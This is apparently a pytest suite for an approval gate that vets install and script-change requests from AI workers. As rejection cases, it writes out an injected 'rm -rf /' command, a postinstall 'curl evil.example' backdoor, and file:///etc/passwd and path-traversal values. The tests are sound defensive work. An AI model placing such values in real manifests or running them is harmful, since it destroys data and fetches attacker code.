"""Unit tests for engine.owner: the code boundary between a station's
`requests` (what an AI worker asks the owner to do) and actually
queuing it. See engine/owner.py's module docstring and docs/STAGE2.md
"3단계 전 요구사항" for why this exists -- the test harness
(tests/acceptance/test_15_dependency_external.py) submits a pending
request directly; real operation must go through validate_pending /
approve_pending instead."""
from __future__ import annotations

import json
from dataclasses import replace

import pytest

from engine.ledger import Event
from engine.owner import approve_pending, validate_pending
from engine.steps.open_job import open_job
from tests.conftest import Workspace


def _with_manifest(workspace: Workspace, manifest: str) -> Workspace:
    """A Workspace whose "alpha" project has `manifest` configured --
    validate_pending refuses any install-like request unless the
    project has a configured manifest to compare against."""
    project = replace(workspace.config.projects["alpha"], manifest=manifest)
    config = replace(workspace.config,
                      projects={**workspace.config.projects, "alpha": project})
    return replace(workspace, config=config)


def _open_attempt(workspace: Workspace, job_name: str) -> str:
    return open_job(workspace.config, workspace.ledger, "alpha", job_name,
                     "full", ("builder",))


def _request_count(workspace: Workspace) -> int:
    return len(workspace.ledger.events("alpha", "request.submitted"))


def _approved_count(workspace: Workspace) -> int:
    return len(workspace.ledger.events("alpha", "owner.approved"))


_INSTALL_REQUEST = {
    "kind": "install", "manifest": "package.json",
    "change": {"dependencies": {"zod": "3.0.0"}},
}


# ---- kind outside whitelist -----------------------------------------------

def test_kind_outside_whitelist_is_rejected(workspace: Workspace) -> None:
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, "wl")
    request = {"kind": "publish", "target": "prod", "artifact_path": "x",
               "artifact_hash": "h"}

    ok, reason = validate_pending(ws.config, "alpha", request)
    assert (ok, reason) == (False, "kind_not_whitelisted")

    before_requests, before_approved = _request_count(ws), _approved_count(ws)
    with pytest.raises(ValueError, match="kind_not_whitelisted"):
        approve_pending(ws.config, ws.ledger, "alpha", attempt_id, request,
                         confirm=True)
    assert _request_count(ws) == before_requests
    assert _approved_count(ws) == before_approved


# ---- malformed payloads, distinct reason per case --------------------------

@pytest.mark.parametrize(
    ("pending_request", "expected_reason"),
    [
        pytest.param(
            {"kind": "install", "manifest": "package-lock.json",
             "change": {"a": 1}},
            "manifest_mismatch", id="wrong_manifest_path",
        ),
        pytest.param(
            {"kind": "install", "manifest": "../package.json",
             "change": {"a": 1}},
            "path_traversal", id="dotdot_manifest",
        ),
        pytest.param(
            {"kind": "install", "manifest": "/etc/package.json",
             "change": {"a": 1}},
            "absolute_path", id="absolute_manifest",
        ),
        pytest.param(
            {"kind": "install", "manifest": "package.json",
             "change": {"scripts": {"build": "make; rm -rf /"}}},
            "shell_metachar", id="shell_metachar_in_change",
        ),
        pytest.param(
            {"kind": "install", "manifest": "package.json", "change": "nope"},
            "change_not_dict", id="change_not_a_dict",
        ),
        pytest.param(
            {"kind": "install", "manifest": "package.json",
             "change": {"a": 1}, "extra": "field"},
            "payload_shape_invalid", id="extra_payload_key",
        ),
    ],
)
def test_malformed_payload_rejected_per_case(
    workspace: Workspace, pending_request: dict, expected_reason: str,
) -> None:
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, "bad")

    ok, reason = validate_pending(ws.config, "alpha", pending_request)
    assert ok is False
    assert reason == expected_reason

    before_requests, before_approved = _request_count(ws), _approved_count(ws)
    with pytest.raises(ValueError, match=expected_reason.replace(".", r"\.")):
        approve_pending(ws.config, ws.ledger, "alpha", attempt_id, pending_request,
                         confirm=True)
    assert _request_count(ws) == before_requests
    assert _approved_count(ws) == before_approved


def test_oversized_request_rejected(workspace: Workspace) -> None:
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, "big")
    request = {"kind": "install", "manifest": "package.json",
               "change": {"blob": "x" * (20 * 1024)}}

    ok, reason = validate_pending(ws.config, "alpha", request)
    assert (ok, reason) == (False, "request_too_large")

    with pytest.raises(ValueError, match="request_too_large"):
        approve_pending(ws.config, ws.ledger, "alpha", attempt_id, request,
                         confirm=True)
    assert _request_count(ws) == 0


def test_line_manifest_change_reuses_installer_line_validator(
    workspace: Workspace,
) -> None:
    """Non-JSON manifest: a bad requirement line (anything the engine's
    own validate_add_lines would reject, e.g. a VCS/URL requirement) is
    rejected through that same function, not a re-derived rule here."""
    (workspace.alpha / "requirements.txt").write_text("", encoding="utf-8")
    ws = _with_manifest(workspace, "requirements.txt")
    attempt_id = _open_attempt(ws, "lines")
    request = {"kind": "install", "manifest": "requirements.txt",
               "change": {"add_lines": ["pkg @ file:///etc/passwd"]}}

    ok, reason = validate_pending(ws.config, "alpha", request)
    assert ok is False
    assert reason.startswith("invalid_line:")

    with pytest.raises(ValueError, match="invalid_line"):
        approve_pending(ws.config, ws.ledger, "alpha", attempt_id, request,
                         confirm=True)
    assert _request_count(ws) == 0


def test_manifest_not_configured_is_rejected(workspace: Workspace) -> None:
    """workspace's default "alpha" project has no manifest configured --
    install-like requests must have nothing to compare against and be
    refused, not silently accepted against an unset value."""
    attempt_id = _open_attempt(workspace, "unconfigured")
    ok, reason = validate_pending(workspace.config, "alpha", _INSTALL_REQUEST)
    assert (ok, reason) == (False, "manifest_not_configured")
    with pytest.raises(ValueError, match="manifest_not_configured"):
        approve_pending(workspace.config, workspace.ledger, "alpha",
                         attempt_id, _INSTALL_REQUEST, confirm=True)


# ---- valid install request -------------------------------------------------

def test_valid_install_request_is_approved_and_queued(workspace: Workspace) -> None:
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, "ok")

    ok, reason = validate_pending(ws.config, "alpha", _INSTALL_REQUEST)
    assert (ok, reason) == (True, "ok")

    request_id = approve_pending(ws.config, ws.ledger, "alpha", attempt_id,
                                  _INSTALL_REQUEST, confirm=True)
    assert request_id.startswith("R-")

    approved_events = ws.ledger.events("alpha", "owner.approved")
    assert len(approved_events) == 1
    _seq, event = approved_events[0]
    assert event.payload["kind"] == "install"
    assert "payload_sha256" in event.payload
    assert len(event.payload["request_preview"]) <= 200
    # no secrets in the preview -- it is exactly the submitted payload
    assert "SECRET" not in event.payload["request_preview"]

    queued = ws.ledger.request(request_id)
    assert queued.status == "queued"
    assert queued.kind == "install"
    assert queued.payload == {
        "manifest": "package.json", "change": {"dependencies": {"zod": "3.0.0"}},
    }

    # approving the identical request again is a no-op on the queue --
    # same request_id, a second 'owner.approved' event is fine.
    request_id_again = approve_pending(ws.config, ws.ledger, "alpha",
                                        attempt_id, _INSTALL_REQUEST, confirm=True)
    assert request_id_again == request_id
    assert len(ws.ledger.events("alpha", "owner.approved")) == 2
    assert _request_count(ws) == 1


# ---- confirm=False ----------------------------------------------------------

def test_confirm_false_is_refused_without_writing_anything(workspace: Workspace) -> None:
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, "noconfirm")

    with pytest.raises(ValueError, match="not_confirmed"):
        approve_pending(ws.config, ws.ledger, "alpha", attempt_id,
                         _INSTALL_REQUEST, confirm=False)
    assert _request_count(ws) == 0
    assert _approved_count(ws) == 0


# ---- scripts_change / test_config_change share the same shape rules -------

@pytest.mark.parametrize("kind", ["scripts_change", "test_config_change"])
def test_other_whitelisted_kinds_follow_the_same_rules(
    workspace: Workspace, kind: str,
) -> None:
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, f"other-{kind}")
    request = {"kind": kind, "manifest": "package.json",
               "change": {"scripts": {"lint": "ruff"}}}

    ok, reason = validate_pending(ws.config, "alpha", request)
    assert (ok, reason) == (True, "ok")
    request_id = approve_pending(ws.config, ws.ledger, "alpha", attempt_id,
                                  request, confirm=True, confirm_source="tty")
    assert ws.ledger.request(request_id).kind == kind


@pytest.mark.parametrize("kind", ["scripts_change", "test_config_change"])
def test_scripts_and_test_config_change_require_interactive_confirm(
    workspace: Workspace, kind: str,
) -> None:
    """scripts_change/test_config_change carry executable strings by
    nature -- --yes (confirm_source="--yes") must never approve one,
    even though validate_pending itself accepts the shape; only "tty"
    confirm_source does. "install" has no such restriction."""
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, f"noninteractive-{kind}")
    request = {"kind": kind, "manifest": "package.json",
               "change": {"scripts": {"lint": "ruff"}}}

    for confirm_source in ("--yes", "unknown"):
        with pytest.raises(ValueError, match="kind_requires_interactive_confirm"):
            approve_pending(ws.config, ws.ledger, "alpha", attempt_id, request,
                            confirm=True, confirm_source=confirm_source)
    assert _request_count(ws) == 0

    request_id = approve_pending(ws.config, ws.ledger, "alpha", attempt_id,
                                 request, confirm=True, confirm_source="tty")
    assert ws.ledger.request(request_id).kind == kind


def test_install_does_not_require_interactive_confirm(workspace: Workspace) -> None:
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, "install-yes")
    request_id = approve_pending(ws.config, ws.ledger, "alpha", attempt_id,
                                 _INSTALL_REQUEST, confirm=True,
                                 confirm_source="--yes")
    assert ws.ledger.request(request_id).kind == "install"


# ---- install's JSON-manifest change is restricted to dependency sections --

def test_install_scripts_section_is_rejected(workspace: Workspace) -> None:
    """Unlike scripts_change/test_config_change, an "install" kind's
    `change` may only touch dependency sections -- this is exactly the
    exploit the restriction closes: an "install" request smuggling a
    scripts.postinstall backdoor must not validate as an ordinary
    dependency bump."""
    ws = _with_manifest(workspace, "package.json")
    request = {"kind": "install", "manifest": "package.json",
               "change": {"scripts": {"postinstall": "curl evil.example"}}}
    ok, reason = validate_pending(ws.config, "alpha", request)
    # 결함 65: renamed from "manifest_section_not_allowed" to
    # "use_scripts_change_kind" -- still rejected (security unweakened),
    # the reason just now names the fix instead of only the mismatch.
    assert (ok, reason) == (False, "use_scripts_change_kind")


@pytest.mark.parametrize(
    ("change", "expected_reason"),
    [
        pytest.param({}, "manifest_change_empty", id="empty_change"),
        pytest.param({"dependencies": "nope"}, "manifest_section_not_dict",
                     id="section_not_dict"),
        pytest.param({"dependencies": {}}, "manifest_section_not_dict",
                     id="section_empty"),
        pytest.param({"dependencies": {"Not_Valid_Name!": "1.0.0"}},
                     "manifest_package_name_invalid", id="bad_package_name"),
        pytest.param({"dependencies": {"zod": "file:/etc/passwd"}},
                     "manifest_version_invalid", id="file_url_version"),
        pytest.param({"dependencies": {"zod": "git+https://evil/x"}},
                     "manifest_version_invalid", id="git_url_version"),
        pytest.param({"dependencies": {"zod": "workspace:*"}},
                     "manifest_version_invalid", id="workspace_version"),
    ],
)
def test_install_json_change_shape_is_validated(
    workspace: Workspace, change: dict, expected_reason: str,
) -> None:
    ws = _with_manifest(workspace, "package.json")
    request = {"kind": "install", "manifest": "package.json", "change": change}
    ok, reason = validate_pending(ws.config, "alpha", request)
    assert (ok, reason) == (False, expected_reason)


def test_install_json_change_accepts_scoped_package_and_semver_range(
    workspace: Workspace,
) -> None:
    ws = _with_manifest(workspace, "package.json")
    request = {
        "kind": "install", "manifest": "package.json",
        "change": {"devDependencies": {"@scope/pkg": "^1.2.3"}},
    }
    ok, reason = validate_pending(ws.config, "alpha", request)
    assert (ok, reason) == (True, "ok")


def test_request_size_limit_is_utf8_bytes_not_characters(workspace: Workspace) -> None:
    """~8,000 CJK characters are ~24,000 UTF-8 bytes -- over the 16KB
    limit in bytes even though the character count alone is not."""
    ws = _with_manifest(workspace, "package.json")
    big_name = "가" * 8000
    request = {"kind": "install", "manifest": "package.json",
               "change": {"dependencies": {big_name: "1.0.0"}}}
    assert len(json.dumps(request, ensure_ascii=False)) < 16 * 1024
    ok, reason = validate_pending(ws.config, "alpha", request)
    assert (ok, reason) == (False, "request_too_large")


def test_approved_preview_never_contains_values(workspace: Workspace) -> None:
    """request_preview (a persisted ledger event) carries section/key
    NAMES only -- never a value, which could be a secret (an authToken)
    or an attacker's payload reflected back into the audit trail."""
    ws = _with_manifest(workspace, "package.json")
    attempt_id = _open_attempt(ws, "preview-redaction")
    request = {
        "kind": "install", "manifest": "package.json",
        "change": {"dependencies": {"pkg": "1.0.0"}, "devDependencies": {}},
    }
    # devDependencies is empty, which validate_pending itself would
    # reject (manifest_section_not_dict) -- use a request that PASSES
    # validation to exercise the preview path end to end instead.
    request = {
        "kind": "install", "manifest": "package.json",
        "change": {"dependencies": {"pkg": "SECRET-LOOKING-VALUE-1.0.0"}},
    }
    approve_pending(ws.config, ws.ledger, "alpha", attempt_id, request, confirm=True)
    _seq, event = ws.ledger.events("alpha", "owner.approved")[0]
    assert "SECRET-LOOKING-VALUE" not in event.payload["request_preview"]
    assert "pkg" in event.payload["request_preview"]
